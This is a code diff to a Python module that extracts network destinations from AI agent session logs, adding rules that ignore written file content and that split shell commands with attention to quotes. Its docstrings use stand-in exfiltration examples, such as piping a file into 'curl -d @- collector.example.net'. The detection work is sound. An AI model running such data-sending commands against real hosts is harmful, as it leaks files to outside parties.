@@ -27,6 +27,8 @@ not indiscriminate:
   ``url``, ``uri``, ``endpoint``, ``host``, ``domain``, ``base_url``,
   ``server``, ``origin``, ``proxy`` and their plurals (see
   :data:`NETWORK_KEYS`). ``{"host": "db.internal"}`` gives ``db.internal``.
+* **Never a host in file content**, whatever the tool or the shape
+  (:data:`CONTENT_KEYS`).
 * **A host in a shell command line**, but only under a field that carries one
   (``command``, ``cmd``, ``script`` …, see :data:`SHELL_KEYS`) and only from
   the arguments of a known network client (:data:`NETWORK_COMMANDS`):
@@ -34,6 +36,12 @@ not indiscriminate:
   ``collector.example.net``, while ``{"command": "grep alibaba.com notes"}``
   gives nothing. This closed the ``shell_domain`` blind spot the v0.7.0
   benchmark measured; :func:`domains_in_command` is the whole of it.
+
+**Content is not a destination either.** The value of a field that carries file
+or document content (:data:`CONTENT_KEYS`: ``content``, ``new_string``,
+``text``, ``body`` …) is not read at all, whatever the tool: a session that
+*writes* ``curl evil.example.net`` into a test file has contacted nobody, and
+the ``Bash`` call that later runs that file is read as it always was.
 
 A bare domain-looking word *anywhere* is not a destination. That distinction
 is what keeps the feature usable: a session that reads a file mentioning
@@ -75,6 +83,27 @@ NETWORK_KEYS = frozenset({
     "api_base", "api_url", "api_host", "proxy", "proxy_url", "webhook", "webhook_url", "address",
 })
 
+#: Fields that carry **file or document content**, which is written rather than
+#: contacted. Nothing is read from them, under any tool.
+#:
+#: A session that writes a test fixture, a README or a code example containing
+#: ``curl evil.example.net`` has reached nobody, and reporting it as egress
+#: buries the finding that counts. Measured on real logs: of the 43 hosts
+#: eleven held-out sessions stopped reading, 19 had only ever been *written*
+#: into a file — the largest single source of false positives in the tool, and
+#: most of them from sessions writing this module's own tests.
+#:
+#: This is the same distinction :func:`extract_call_domains` already made for a
+#: tool's **result** (read only when the arguments pointed somewhere), applied
+#: to the arguments of a tool that writes. It is scoped to the content keys, so
+#: nothing else changes: a ``command`` is still a command (:data:`SHELL_KEYS`)
+#: and a ``url`` is still a destination (:data:`NETWORK_KEYS`), so the ``Bash``
+#: call that *runs* the file written above is read exactly as before.
+CONTENT_KEYS = frozenset({
+    "content", "contents", "new_string", "old_string", "file_text", "new_source", "old_source",
+    "text", "body", "edits", "patch", "diff", "replacement",
+})
+
 MAX_SCAN_DEPTH = 32                  # nesting levels walked into one argument object
 MAX_SCAN_STRINGS = 2000              # strings examined per call
 MAX_STRING_CHARS = 10 * 1024 * 1024  # characters examined of any one string (the parsers' line limit)
@@ -92,13 +121,31 @@ TRUNCATED_STRING = "string"          # one string longer than MAX_STRING_CHARS
 TRUNCATED_DEPTH = "depth"            # nested deeper than MAX_SCAN_DEPTH
 TRUNCATION_REASONS = (TRUNCATED_DOMAINS, TRUNCATED_STRINGS, TRUNCATED_STRING, TRUNCATED_DEPTH)
 
-_URL = re.compile(r"(?:https?|wss?|ftps?)://(?P<host>[^\s/?#\\\"'<>()\[\]{},;]+)", re.IGNORECASE)
+#: A scheme, then either a bracketed IPv6 literal or a run of characters that a
+#: hostname may hold. The backtick is excluded with the quotes: a host never
+#: contains one, and a URL at the end of a markdown span is followed by one.
+_URL = re.compile(r"(?:https?|wss?|ftps?)://"
+                  r"(?P<host>\[[0-9A-Fa-f:.]{2,45}\]|[^\s/?#\\\"'`<>()\[\]{},;]+)",
+                  re.IGNORECASE)
 _IPV4 = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
+_IPV6 = re.compile(r"^\[[0-9A-Fa-f:.]{2,45}\]$")
 _HOST = re.compile(r"""
     ^(?=.{1,253}$)                      # a hostname is at most 253 characters
     (?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+   # one or more labels, each ending in alphanumeric
     [a-z]{2,63}$                        # a letters-only public suffix
 """, re.IGNORECASE | re.VERBOSE)
+
+#: Punctuation that prose and markdown put around a URL and a hostname never
+#: holds. Stripped from both ends of an extracted authority, which is how
+#: ``see https://api.example.com.`` and ``` `https://x.example.com` ``` used to
+#: yield ``api.example.com.`` and ``x.example.com` ``. A URL's host can only
+#: carry it at the end (the pattern starts after ``://``); a bare value under a
+#: network-named key can carry it at either.
+_TRAILING = "`\"'()[]{}<>,.;:!?*_"
+
+#: The one single-label name that is a real destination. Everything else without
+#: a dot is a word, a variable or a fragment: ``a``, ``api``, ``r``.
+_LOCALHOST = "localhost"
 
 
 @dataclass(slots=True)
@@ -148,8 +195,31 @@ def normalise_host(raw: str | None) -> str | None:
         host = host[:end + 1] if end != -1 else host
     else:
         host = host.split(":")[0]                             # drop the port
+        host = host.strip(_TRAILING)                          # markdown and prose, not a hostname
     host = host.rstrip(".").lower()
     return host or None
+
+
+def host_shape(host: str | None) -> str | None:
+    """``host`` when it is shaped like one, else None. One notion, used everywhere.
+
+    A destination is a dotted name with a letters-only suffix
+    (``api.openai.com``), an address literal (``1.2.3.4``, ``[::1]``), or
+    ``localhost``. Anything else is a word that happened to follow ``://``:
+    ``a``, ``api``, ``r``, ``h%d.example.net``, ``x`` with a backtick on it.
+    Those are what a URL search used to hand over as destinations, because the
+    shape test was applied to bare values only — one rule for a field that
+    names a host and none at all for a URL.
+
+    Nothing is resolved here either: the shape is the only thing checked.
+    """
+    if not host:
+        return None
+    if host.startswith("["):
+        return host if _IPV6.match(host) else None
+    if host == _LOCALHOST or _IPV4.match(host):
+        return host
+    return host if _HOST.match(host) else None
 
 
 def domains_in_text(text: str, scan: _Scan | None = None) -> set[str]:
@@ -177,7 +247,7 @@ def domains_in_text(text: str, scan: _Scan | None = None) -> set[str]:
         return set()
     found = set()
     for m in _URL.finditer(text):
-        host = normalise_host(m.group("host"))
+        host = host_shape(normalise_host(m.group("host")))
         if host:
             found.add(host)
     return found
@@ -211,12 +281,10 @@ def host_in_value(value: str) -> str | None:
     destination as a name, and a URL's authority already keeps one. Nothing is
     resolved in either direction — a name is never turned into an address.
     """
-    host = normalise_host(value)
+    host = host_shape(normalise_host(value))
     if not host:
         return None
-    if _IPV4.match(host) or host.startswith("["):
-        return host
-    return host if _HOST.match(host) and host.rsplit(".", 1)[-1] not in NOT_HOSTS else None
+    return None if host.rsplit(".", 1)[-1] in NOT_HOSTS else host
 
 
 # ------------------------------------------------------- shell command lines
@@ -312,11 +380,6 @@ MAX_SHELL_DEPTH = 1
 #: remote command then reached.
 _ONE_DESTINATION = frozenset({"ssh", "telnet"})
 
-#: An IPv6 literal in brackets, and nothing else that merely starts with ``[``.
-#: :func:`host_in_value` keeps anything bracketed, because under a key that
-#: names a host ``[::1]`` is one; a bracketed *command-line* token is far more
-#: often a character class (``grep -o "[0-9]"``), so here the shape is checked.
-_IPV6 = re.compile(r"^\[[0-9A-Fa-f:.]{2,45}\]$")
 
 #: Leading words that wrap a command without being one. ``sudo``, ``env VAR=x``
 #: and friends are skipped so the program underneath is the one judged.
@@ -390,8 +453,42 @@ _VALUE_OPTIONS = {
 }
 
 #: Segment separators, the two-character operators first so ``||`` and ``&&``
-#: are not split into empty segments.
+#: are not split into empty segments. Used on a line whose quoting does not
+#: balance; :func:`_split_segments` is the quote-aware version.
 _SEGMENTS = re.compile(r"\|\||&&|[|;&\n\r]")
+
+#: One pass over a command line, matching either a **quoted span** or a
+#: **separator**. Scanning for both at once is what makes quote-aware splitting
+#: as cheap as the plain split: the regex engine does the character work and
+#: only the few matches are handled in Python.
+#:
+#: A single-quoted span holds no escapes (POSIX); a double-quoted one honours
+#: ``\"``. A separator inside either is part of an argument, not a separator:
+#: ``git commit -m "fix; curl api.example.net"`` runs one command, and reading
+#: the fragment after the semicolon as a second one made a *mention* of a curl
+#: look like an invocation. That was the last large source of false positives
+#: measured on real logs.
+#: A quoted span never crosses a line here (see :func:`_split_segments`), so
+#: neither pattern may match a newline: no ``re.DOTALL``, and the classes
+#: exclude the line breaks.
+_QUOTED_OR_SEPARATOR = re.compile(r"""
+      '[^'\n\r]*'                     # a single-quoted span: no escapes inside it
+    | "(?:\\[^\n\r]|[^"\\\n\r])*"      # a double-quoted span, with \" escapes
+    | \|\| | &&                      # the two-character operators
+    | [|;&]                          # and the one-character ones
+""", re.VERBOSE)
+
+#: Line breaks separate commands unconditionally, and are taken out first: a
+#: quote is balanced or not *within one line*, so a stray apostrophe cannot
+#: change how the lines around it are read.
+_LINES = re.compile(r"[\n\r]")
+
+_QUOTES = ("'", '"')
+
+#: Is there anything to split on at all? A command line with no separator is
+#: one segment, and most are: this is the cheap way to say so before any of the
+#: work below.
+_HAS_SEPARATOR = re.compile(r"[|;&\n\r]")
 
 #: A leading ``VAR=value``, which is an assignment and not the program.
 _ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
@@ -444,13 +541,8 @@ def _destinations_in_arg(value: str, program: str, colon_fields: bool = False) -
 
 
 def _bare_host(text: str) -> str | None:
-    """``text`` up to its path as a host, with brackets held to the IPv6 shape."""
-    authority = re.split(r"[/?#]", text, maxsplit=1)[0]
-    if authority.startswith("["):                        # an IPv6 literal, or a character class
-        end = authority.find("]")
-        if end == -1 or not _IPV6.match(authority[:end + 1]):
-            return None
-    return host_in_value(authority)
+    """``text`` up to its path as a host; :func:`host_shape` holds the brackets to IPv6."""
+    return host_in_value(re.split(r"[/?#]", text, maxsplit=1)[0])
 
 
 def _strip_prefixes(tokens: list[str]) -> list[str]:
@@ -579,7 +671,8 @@ def domains_in_command(command: str, budget: list[int] | None = None) -> set[str
     ``"cat x | curl -d @- collector.example.net"`` gives
     ``collector.example.net``; ``"grep alibaba.com notes"`` gives nothing. The
     line is split into segments on ``|``, ``||``, ``&&``, ``;``, ``&`` and
-    newlines; each segment is tokenised with :mod:`shlex`; the wrappers
+    newlines **outside quotes**; each segment is tokenised with :mod:`shlex`;
+    the wrappers
     (``sudo``, ``env VAR=x``, ``time``, ``nohup``, ``command``, ``exec``) and
     leading assignments are dropped; and the program that is left decides
     whether any argument is read at all.
@@ -608,18 +701,75 @@ def domains_in_command(command: str, budget: list[int] | None = None) -> set[str
     return scan.found
 
 
+def _split_segments(command: str) -> list[str]:
+    """``command`` cut into the commands it runs, ignoring separators inside quotes.
+
+    ``curl a.example.net; curl b.example.net`` is two commands;
+    ``echo "a; wget b.example.net"`` is one, and nothing in it is a wget.
+
+    **Line by line.** A line break always separates commands, so the quoting of
+    one line cannot change how another is read. That matters on a log: a tool
+    call carrying a heredoc or a script holds dozens of lines, each with its own
+    quotes, and pairing a quote on one line with a quote twenty lines later
+    would move every segment boundary in between. Measured on real logs, doing
+    it globally found *more* spurious hosts than the plain split, not fewer.
+
+    One exact fast path comes first, because this runs on every command line of
+    every session: a line with no separator at all is one segment, whatever its
+    quoting.
+
+    **Unbalanced quoting falls back to the plain split** for that line, which is
+    what this did for every line before: a quote that never closes means the
+    structure cannot be trusted, and a malformed command line is exactly the
+    shape an exfiltration attempt would take, so the conservative reading (more
+    segments, more destinations) is the one to keep. An apostrophe in prose
+    lands here too, and that is the right side to err on.
+    """
+    if not _HAS_SEPARATOR.search(command):
+        return [command]                         # one command, whatever its quoting
+    out: list[str] = []
+    for line in _LINES.split(command):
+        out += _split_line(line)
+    return out
+
+
+def _split_line(line: str) -> list[str]:
+    """One line cut on its separators, ignoring those inside quotes."""
+    quotes = line.count("'") + line.count('"')
+    if not quotes:
+        return _SEGMENTS.split(line)             # nothing to protect: the plain split
+    segments, start, inside = [], 0, 0
+    for m in _QUOTED_OR_SEPARATOR.finditer(line):
+        text = m.group()
+        if text[0] in _QUOTES:
+            # A quoted span, consumed whole: the separators in it are not ones.
+            inside += text.count("'") + text.count('"')
+            continue
+        segments.append(line[start:m.start()])
+        start = m.end()
+    if inside != quotes:
+        # A quote character the span pattern could not pair: the quoting of this
+        # line does not balance, so its structure cannot be trusted. Counting is
+        # how that is detected without slicing once per match.
+        return _SEGMENTS.split(line)
+    segments.append(line[start:])
+    return segments
+
+
 def _scan_command(command: str, scan: _Scan, depth: int) -> None:
     """Read one command line into ``scan``, segment by segment.
 
-    The whole line is split: the split is one linear pass, so padding cannot
-    push a later segment out of view. Only *quoting* is bounded. Past
+    The whole line is split, in one linear pass, so padding cannot push a later
+    segment out of view — and the split respects quotes
+    (:func:`_split_segments`), so a separator inside an argument does not
+    invent a command. Only *lexing* is bounded. Past
     :data:`MAX_SHLEX_CHARS` of command line, segments are split on whitespace
     instead of lexed by :mod:`shlex`, which is some hundred times faster and
     loses no destination (a quoted argument keeps its quotes, and
     :func:`_destinations_in_arg` strips them); it only mis-splits an argument
     that contains a space, which is not a host.
     """
-    for segment in _SEGMENTS.split(command):
+    for segment in _split_segments(command):
         if scan.spent:
             scan.note(TRUNCATED_DOMAINS if len(scan.found) >= MAX_DOMAINS else TRUNCATED_STRINGS)
             return
@@ -685,6 +835,8 @@ def _walk(value, network_key: bool, shell_key: bool, scan: _Scan, depth: int) ->
             # A nested object under a network-named key is not itself a host,
             # but its own keys may be ("endpoint": {"host": ...}).
             name = key.strip().lower() if isinstance(key, str) else ""
+            if name in CONTENT_KEYS:
+                continue            # file or document content: written, not contacted
             _walk(inner, name in NETWORK_KEYS, name in SHELL_KEYS, scan, depth + 1)
         return
     if isinstance(value, (list, tuple)):
